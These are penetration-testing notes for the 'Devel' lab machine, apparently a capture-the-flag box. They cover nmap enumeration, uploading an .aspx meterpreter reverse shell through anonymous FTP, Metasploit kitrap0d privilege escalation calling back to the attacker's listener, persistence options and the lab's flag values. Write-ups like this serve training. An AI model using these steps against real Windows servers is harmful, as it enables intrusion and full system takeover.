# devel — Penetration Testing Notes
devel — Penetration Testing Notes

# 1. Target Information
    • IP Address: 10.129.5.131
    • Hostname: DEVEL
    • Operating System: Windows 7 Enterprise (x86), Build 7600
    • Ports Open (quick scan):
        ◦ 21/tcp – Microsoft ftpd (Anonymous login allowed)
        ◦ 80/tcp – Microsoft IIS 7.5
    • Ports Open (full scan):
        ◦ Same as above (only 21 & 80 reachable)


# 2. High-Level Recon Summary
    • Entry point: FTP writable via Anonymous upload.
    • Web service: IIS 7.5 hosting ASP.NET pages.
    • Key issue: .aspx files uploaded to FTP are served and executed by the web server.
    • Vulnerability: Arbitrary file upload → Remote Code Execution.
    • Privilege escalation: Windows 7 kernel exploit MS10-015 (kitrap0d) successfully escalates to SYSTEM.


# 3. Enumeration

## 3.1 Nmap Results
Quick Scan
Command:

```bash
nmap -sC -sV 10.129.5.131 -oN quick.txt
```

Results:
    • FTP: Microsoft ftpd, anonymous login allowed, full read/write access.
    • HTTP: Microsoft IIS 7.5 default IIS7 page.
    • HTTP headers reveal ASP.NET is enabled.

### Full TCP Scan
Command:
```bash
nmap -p- --min-rate 1000 -T4 10.129.5.131 -oN full.txt

```

**Key findings:**
    • No additional open TCP ports.
    • Windows 7, no SMB access.
---

## 3.2 Service Enumeration Checklist
FTP (21)
    • Anonymous login: YES
    • Writable dirs: Yes — root of FTP lets you upload .aspx
    • Software: Microsoft ftpd
    • Known vulns: Upload abuse → RCE
    • Commands tested:
        ◦ ftp, ls, put, get, cd, mget
SSH (22)
    • Closed
HTTP (80)
    • Server: Microsoft IIS/7.5
    • Directories found: aspnet_client
    • Interesting: .aspx executes server-side
    • Tools used: curl, gobuster
    • Found: Uploading .aspx to FTP → accessible via HTTP
SMB (445)
    • Filtered
SMTP, Databases
    • None present.


# 4. Vulnerability Discovery

## 4.1 Web Vulnerabilities
    • Confirmed: Arbitrary file upload → RCE by uploading .aspx shell
    • No auth portals or CMS
    • No LFI/RFI
    • No SQLI

## 4.2 Service Vulnerabilities
    • FTP misuse (writable root)
    • IIS executes uploaded .aspx files
    • Windows 7 build 7600 vulnerable to multiple kernel exploits

## 4.3 Credentials Found
None needed.


# 5. Initial Foothold

## 5.1 Access Method
    • Technique: Uploading malicious .aspx shell via Anonymous FTP
    • Payload: msfvenom -p windows/meterpreter/reverse_tcp
    • Execution: Browsing to http://<IP>/shell.aspx

## 5.2 Shell Details
    • Initial user: iis apppool\web
    • Type: Meterpreter x86
    • Permissions: Very restricted, no access to home directories


# 6. Privilege Escalation

## 6.1 Local Enumeration
Commands used:
    • sysinfo
    • systeminfo
    • whoami
    • Meterpreter local_exploit_suggester
Findings:
    • Windows 7 Enterprise, x86 → vulnerable to multiple kernel exploits
    • Logged in as low-priv IIS AppPool user
    • No UAC bypass (not admin user)

## 6.2 Potential Priv-Esc Paths
    • UAC bypass (not effective)
    • Kernel exploit: MS10-015 (kitrap0d)
    • MS16-032
    • MS13-053
    • MS14-058

## 6.3 Exploitation
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
set LHOST <VPN IP>
set LPORT 4444
run

Result:
Obtained SYSTEM shell.

---

# 7. Loot / Flags

## 7.1 User Flag
    • Path: C:\Users\babis\Desktop\user.txt
    • Command: type user.txt
    • Value: 64e3f44cb9ed572d07f3e5363f9ffcf2

## 7.2 Root Flag
    • Path: C:\Users\Administrator\Desktop\root.txt
    • Command: type root.txt
    • Value: a29848189e96d9fe35c3014db25e1469

## 7.3 Other Interesting Data
    • Full meterpreter access
    • Ability to download files:
download "c:\\Users\\babis\\Desktop\\user.txt" .


# 8. Post-Exploitation Notes
    • Persistence possible using:
        ◦ Run keys
        ◦ Startup folder
        ◦ schtasks
        ◦ Service creation
    • Impact (real-world):
        ◦ Complete takeover of Windows server
        ◦ Website compromise
        ◦ File exfiltration
        ◦ Service disruption
    • This was a classic IIS + FTP misconfiguration exploitation path.


# 9. Lessons Learned / To Improve
    • Metasploit listener troubleshooting: LHOST/LPORT mistakes, payload mismatch, firewall considerations.
    • Better OPSEC: Clean up uploaded shells afterward.
    • Automation: Create a Devel-auto script:
        ◦ FTP upload
        ◦ Trigger shell
        ◦ Auto handler
    • Note: Netcat worked even when Meterpreter struggled — always test simple reverse shells.
